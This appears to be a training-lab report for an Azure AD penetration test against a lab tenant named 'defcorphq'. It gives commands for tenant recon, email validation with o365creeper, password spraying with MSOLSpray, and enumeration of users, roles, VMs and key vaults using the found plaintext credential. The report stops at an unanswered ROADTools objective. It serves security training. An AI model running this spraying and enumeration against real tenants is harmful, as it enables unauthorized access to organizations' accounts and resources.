# Azure AD Pentest - Lab Report

- [Azure AD Pentest - Lab Report](#azure-ad-pentest---lab-report)
  - [Objective 1: Basic Recon](#objective-1-basic-recon)
    - [Is the organization using Azure AD?](#is-the-organization-using-azure-ad)
    - [ID of Tenant](#id-of-tenant)
    - [Validate email IDs](#validate-email-ids)
    - [Azure Services used by the organization](#azure-services-used-by-the-organization)
  - [Objective 2: Initial Access](#objective-2-initial-access)
    - [Questions](#questions)
    - [Brute force](#brute-force)
    - [Enumerate Users / Groups / Devices / Directory Roles / Enterprise Applications on Azure Portal](#enumerate-users--groups--devices--directory-roles--enterprise-applications-on-azure-portal)
  - [Objective 3: Authenticated Enumerations using AzureAD Module](#objective-3-authenticated-enumerations-using-azuread-module)
    - [Users](#users)
    - [Groups](#groups)
    - [Devices](#devices)
    - [Directory Role Global Administrator](#directory-role-global-administrator)
    - [All custom directory roles (Azure Preview)](#all-custom-directory-roles-azure-preview)
    - [Enterprise Applications](#enterprise-applications)
  - [Objective 3: Authenticated Enumeration using Az PowerShell](#objective-3-authenticated-enumeration-using-az-powershell)
    - [All resources visible to the user](#all-resources-visible-to-the-user)
    - [All Azure roles assigned to the user](#all-azure-roles-assigned-to-the-user)
    - [Virtual Machines](#virtual-machines)
    - [App Services](#app-services)
    - [Function Apps](#function-apps)
  - [Storage Accounts](#storage-accounts)
  - [Key Vaults](#key-vaults)
  - [Objective 5: Authenticated Enumeration using Azure CLI](#objective-5-authenticated-enumeration-using-azure-cli)
    - [Virtual Machines](#virtual-machines-1)
    - [App Services](#app-services-1)
    - [Function Apps](#function-apps-1)
    - [Storage Accounts](#storage-accounts-1)
    - [Key Vaults](#key-vaults-1)
  - [Objective 6: Authenticated Enumeration - ROADTool](#objective-6-authenticated-enumeration---roadtool)

---

## Objective 1: Basic Recon

**Questions**

Gather the following information about the defcorphq organization:

- Is the organization using Azure AD? 
- ID of Tenant  
- Validate email IDs  
- Azure Services used by the organization

<br/>

**Answers**

### Is the organization using Azure AD?

To verify if the organization is using Azure AD, we can try to see if an Azure Tenant related to the company exists using the keyword `defcorphq`:

```
https://login.microsoftonline.com/getuserrealm.srf?login=root@defcorphq.onmicrosoft.com&xml=1
```

![picture 8](images/6f16946dc9aa1b7d764b965f76b96c8d40e79d972d2a4abd1151025be406cfe0.png)  

This confirms that the organization is in fact using Azure AD.

<br/>

We can also use AADInternals tool to enumerate:

```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
```

![picture 10](images/364e00f7c08cd9f835709b5c36ff4a00a6575fba38eeab49c61353f1d3478b67.png)  


<br/>

### ID of Tenant

To obtain the ID of the Tenant:

```
https://login.microsoftonline.com/defcorphq.onmicrosoft.com/.well-known/openid-configuration
```

![picture 9](images/ff229051a258e8547450a1e68c96ada916da30a271f3fbace94506dced24788f.png)  

The tenant ID is `2d50cb29-5f7b-48a4-87ce-fe75a941adb6`

<br/>

We can also use AADInternals tool:

```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
```

![picture 11](images/22422075411b72570d3d03897981bee591dd9916ed6e3a3a4612d9881e71dd94.png)  


<br/>

### Validate email IDs

To enumerate valid email IDs, first we need a list of emails. For example:

![picture 12](images/00810d667085c8996d5f61c16adfa103e7da627bfdf5ff1e193e3b3153856dd0.png)  

Then we can use **o365creeper** to check if they are valid:

```
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
```

![picture 13](images/452592e87c17ec2edd6a4e5d9ad3f0473305a41a54341798ba8470b19b735a4b.png)  

<br/>

### Azure Services used by the organization

To enumerate Azure Services used by the organization, we can use **MicroBurst**:

```
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

![picture 15](images/cd7fe38ac88b9e8039379188cd898195a3d8c6740dca16d0f559e179a74fac1f.png)  

- Email (defcorphq.mail.protection.outlook.com)
- Microsoft Hosted Domain (defcorphq.onmicrosoft.com)
- SharePoint (defcorphq.sharepoint.com / defcorphq-my.sharepoint.com)

<br/>

---

## Objective 2: Initial Access

### Questions

- Brute-force one of the users that we enumerated from the defcorphq tenant.
- Enumerate the following for the defcorphq tenant using Azure Portal: 
  - Users
  - Groups
  - Devices
  - Directory Roles
  - Enterprise Applications

<br/>

### Brute force

With a valid email list obtained in Objective 1, we can use `MSOLSpray` to perform a password spray:

```
. C:\AzAD\Tools\MSOLSpray\MSOLSPray.ps1

Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPassword@1234 -Verbose
```

![picture 16](images/b61c3977af8c1c6babc4a0a82d94f05ab9f6a99a518a481c6e97fb03c039b905.png)  

As shown, we can access the Azure with the following credential:

- `test@defcorphq.onmicrosoft.com` / `SuperVeryEasytoGuessPassword@1234`

<br/>

### Enumerate Users / Groups / Devices / Directory Roles / Enterprise Applications on Azure Portal

First login with the found credentials:

- https://portal.azure.com

![picture 17](images/53636cf52d52e824c4cb86337aa5efee320ad88168dd1f651bfc14e9ead31da3.png)  

<br/>

To view users:

![picture 18](images/c963b6a64f7363b679249ce7075c415b9f0b59707eff3015ba1ad59983765175.png)  

![picture 19](images/b23325d8901224a8eeeff6def092453157a6d3a53915247cced5408a4e6a9471.png)  

<br/>

To view groups:

![picture 20](images/1ce3dbb45679d942cd2717ef9751676f6b94c004cce2bf565ad9e0494d221e16.png)  

![picture 21](images/2c4ab38e6fdcace6bbbbf39824b4472c26a35060b4a7d9f30e627e01a207997c.png)  

<br/>

To view Devices:

![picture 22](images/fd52410d1e2136936f1d332afbb3f028cd4de8b25f5bd6c4be240bab65d45c29.png)  

![picture 23](images/5e9272dfd466a43ccfc3bcf3dab8a73cbc6d2e292fcda0da70f951a9ba4fdd1c.png)  

<br/>

To view directory roles:

![picture 24](images/05f26e8788cff4ff437a8069779579ead4ad3422369620ba34c3c97df60ece52.png)  

![picture 25](images/07dcc7c7fd98f4aa14dd4bb453bc2958bae936370fe87f89ebf79109e502c832.png)  

<br/>

To view enterprise applications:

![picture 26](images/0fcca73fb76dd72c5d9ca2a18c78b3d859265571653a843609675928cfa20af9.png)  

![picture 27](images/a4c3375179ace4602b19318467f1a59065be3e7e3d8a139d49be31062c1db12f.png)  

<br/>

---

## Objective 3: Authenticated Enumerations using AzureAD Module

Enumerate the following for the defcorphq tenant using AzureAD PowerShell module

- Users
- Groups
- Devices
- Directory Role Global Administrator
- All custom directory roles (Azure Preview)
- Enterprise Applications

<br/>

### Users

First import AzureAD module:

```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force ; $creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd) ; Connect-AzureAD -Credential $creds
```

![picture 67](images/d4a1b4ec0b3b841948169afc31abe62109a225e81f15dfd577a4c4121c92bf4b.png)  


<br/>

To enumerate users:

```
Get-AzureADUser -All $true
```

![picture 68](images/c706a7fcd2bb2e0971416daf0124910d21201015d55bc8df66dfc0e1fb9f5521.png)  

<br/>

### Groups

To enuemrate Groups:

```
Get-AzureADGroup -All $true
```

![picture 69](images/a1e4f3079118d415aa0fe73d5fab159f3c5b89af31b507e24fc2dec06cb9dd3a.png)  

<br/>

### Devices

To enumerate Devices:

```
Get-AzureADDevice -All $true
```

![picture 70](images/fccefa100e940fd48287b1a0d08e9e3a9c3af8e846316cc87205b7880056a856.png)  

<br/>

### Directory Role Global Administrator

To enumerate users with Global Administrator role:

```
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```

![picture 71](images/30ebed333edde5fa2be3f13c1c67c5d722beb82c8d6b7d0ddf9086e75e7fa880.png)  

<br/>

### All custom directory roles (Azure Preview)

To list custom roles, **AzureADPreview** module can be used:

```
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzureAD -Credential $creds

Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

![picture 74](images/e8d53ff46e004736d6fe77cd764b8697832ef94424d282aaf93aa14faf93325a.png)  

<br/>

### Enterprise Applications

To enuemrate enterprise applications (Note this is **Service Principal but not App!**):

```
Get-AzureADServicePrincipal -All $true
```

![picture 76](images/3477d29709b4d739c9e94bb81c272547d2cdeea2736c2cd56600960539cd269e.png)  


<br/>

---

## Objective 3: Authenticated Enumeration using Az PowerShell

**Question**

Enumerate the following for the defcorphq tenant using Az PowerShell module using the credentials of `test@defcorphq.onmicrosoft.com` user:
- All resources visible to the user 
- All Azure roles assigned to the user 
- Virtual Machines 
- App Services 
- Function Apps 
- Storage Accounts
- Key Vaults

<br/>

**Answer**

### All resources visible to the user 

First authenticate with Azure:

```
$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzAccount -Credential $creds
```

![picture 91](images/d20978857baf52cc65f27e34024c04357326673a467d171ce1354a47bd03bf80.png)  

<br/>

To enumerate all resources visible to the current user:

```
Get-AzResource | Select Name, ResourceGroupName, ResourceType
```

![picture 92](images/d4f92f4f66f30de1a78b2df24f6650bd2cd0f07c25c330a9008409e555bda8a9.png)  

<br/>

### All Azure roles assigned to the user

To enuemrate the roles assigned to the current user:

```
Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com | ft DisplayName, RoleDefinitionName, ObjectType, CanDelegate
```

![picture 93](images/4e27b44f0ca173c21594f303c1630bf9312a7e5e24f17422ef2378c4b935c3a3.png)  

<br/>

### Virtual Machines

To enuemrate VM where the current user has at least READ access:

```
Get-AzVM | fl *
```

![picture 94](images/fb92df6043f476403cc91f46b609b2b513fa499682bbcd18330f50d76f4cda8b.png)  

<br/>

### App Services 

Note that **App Services** refers to **web hosting service**.

```
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"} | ft Name, HostNames, DefaultHostName, Kind, Type
```

![picture 95](images/a032f24f23146ae38053ed78fd059b6578e339d75b4a842519dc82381323ba04.png)  

<br/>

### Function Apps

To enuemerate Function Apps:

```
Get-AzFunctionApp | ft Name, HostNames, DefaultHostName, Kind, Type
```

![picture 96](images/813ca7efe92ff3c6e8d73dcd5627aaf0f0b8b1358e6bf6e87430527caa12730b.png)  

<br/>

## Storage Accounts

To enuemrate storage accounts:

```
Get-AzStorageAccount | fl *
```

![picture 97](images/ed6c5ac314b1293ed0be2d49f96dc16e837a56f62078e0984fa77f3ea25af54e.png)  

<br/>

## Key Vaults

To enumerate key vaults:

```
Get-AzKeyVault | fl *
```

![picture 98](images/ee56a267f1d9ac65e5eb436590ca1abdc46a9b5ca060bcf9120115dc9ff55496.png)  

<br/>

---

## Objective 5: Authenticated Enumeration using Azure CLI

**Questions**

Enumerate the following for the defcorphq tenant using az cli using the credentials of `test@defcorphq.onmicrosoft.com` user:

- Virtual Machines
- App Services
- Function Apps
- Storage Accounts
- Key Vaults

<br/>

**Answers**

### Virtual Machines

First authenticate with the compromised credential:

```
az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234 --allow-no-subscriptions
```

![picture 128](images/bd15f073e572e652c544392f1955c6ed12bd6c589d9f09317749f61a6e9e74f6.png)  


<br/>

To list all VMs:

```
az vm list --query "[].name"
```

![picture 129](images/668a3573ef11581744c251df34715421c3198beeb098f33867c54043cbe6f19b.png)  

<br/>

### App Services

To list app services (webapp):

```
az webapp list --query "[].hostNames"
```

![picture 130](images/7aecd518602bf9db22d872efb2560f0e6aec448d44beed8dad513b291895648f.png)  

<br/>

### Function Apps

```
az functionapp list --query "[].hostNames"
```

![picture 131](images/9532c2f068a895194a3faa3a59209d96ef8ab172180203e15c6ee658083c7f36.png)  

<br/>

### Storage Accounts

```
az storage account list
```

### Key Vaults

```
az key vault list
```

<br/>

---

## Objective 6: Authenticated Enumeration - ROADTool

**Questions**

Enumerate the following for the defcorphq tenant using ROADTools with the credentials of test@defcorphq.onmicrosoft.com user:

1. Check if the 'Operations' Group is allowed to use Finance Management System app
2. Permissions that AdminAppSimulation has for Mark D Walden

<br/>

**Answer**

